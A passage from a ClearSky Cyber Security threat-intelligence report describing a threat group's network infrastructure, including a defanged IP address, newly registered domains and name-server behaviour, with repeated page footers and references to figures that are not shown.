23.94.22[.]145. As of May, two new domains were registered by the group. Please\n\nnote the domain ending with .ru is not part of this array:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nThis server’s Name Server points to the displayed IP address, while the domain points to other\n\naddresses:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nThe use of the address 5.5.5.5 indicates DNS queries as well.
